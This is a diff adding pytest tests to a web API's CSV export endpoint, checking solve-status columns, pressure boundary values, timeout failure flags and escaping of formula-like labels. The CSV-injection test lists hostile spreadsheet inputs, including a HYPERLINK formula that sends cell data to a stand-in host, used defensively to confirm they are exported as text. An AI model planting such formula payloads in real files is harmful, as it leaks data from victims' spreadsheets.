@@ -222,6 +222,40 @@ def test_export_returns_a_csv_with_one_row_per_entity() -> None:
     assert any(k.startswith("P [") for k in rows[0])
 
 
+def test_export_rows_carry_the_solve_status() -> None:
+    r = _post("/export", _pipe())
+    assert r.headers["x-combaero-success"] == "true"
+    rows = list(csv.DictReader(io.StringIO(r.text)))
+    assert {row["success"] for row in rows} == {"True"}
+    assert {row["outcome"] for row in rows} == {r.headers["x-combaero-outcome"]}
+    assert list(rows[0])[:11] == [
+        "type", "kind", "is_boundary", "combustion_method", "id", "label",
+        "success", "converged", "consistent", "outcome", "final_norm",
+    ]  # fmt: skip
+
+
+def test_a_pressure_boundary_exports_its_reservoir_state_not_a_default() -> None:
+    """A pressure boundary emits only Pt/Tt; its static P used to be a
+    made-up 101325 Pa beside Pt = 2 bar and a rho evaluated at 2 bar."""
+    rows = {row["id"]: row for row in csv.DictReader(io.StringIO(_post("/export", _pipe()).text))}
+    assert float(rows["inlet"]["P [Pa]"]) == float(rows["inlet"]["Pt [Pa]"]) == 2.0e5
+    assert float(rows["outlet"]["P [Pa]"]) == 1.9e5
+
+
+@pytest.mark.parametrize(
+    "label",
+    ['=HYPERLINK("http://example.invalid/?"&A1,"x")', "+1+1", "-2+3", "@SUM(1)", "\tcmd"],
+)
+def test_a_label_a_spreadsheet_would_run_is_exported_as_text(label: str) -> None:
+    """CSV injection: a shared network's label must not run as a formula
+    when the export is opened in a spreadsheet."""
+    body = _pipe()
+    body["nodes"][1]["data"]["label"] = label
+    rows = {row["id"]: row for row in csv.DictReader(io.StringIO(_post("/export", body).text))}
+    assert rows["ch"]["label"] == "'" + label
+    assert rows["inlet"]["label"] == ""
+
+
 def test_resolve_preview_returns_the_resolved_geometry() -> None:
     body = _pipe()
     body["nodes"][1]["data"] = {"L": 0.5, "D": None}  # inherits: nothing upstream
@@ -553,6 +587,12 @@ def test_the_soft_timeout_ends_the_solve(route: str) -> None:
     assert r.elapsed < 5.0
     if route == "/solve":
         assert r.json()["success"] is False and "timed out" in r.json()["message"]
+    else:
+        # The CSV still comes back, but it says the solve failed: in a header
+        # for the GUI and on every row for whoever opens the file.
+        assert r.headers["x-combaero-success"] == "false"
+        rows = list(csv.DictReader(io.StringIO(r.text)))
+        assert rows and {row["success"] for row in rows} == {"False"}
 
 
 @pytest.mark.parametrize("route", ["/solve", "/export"])
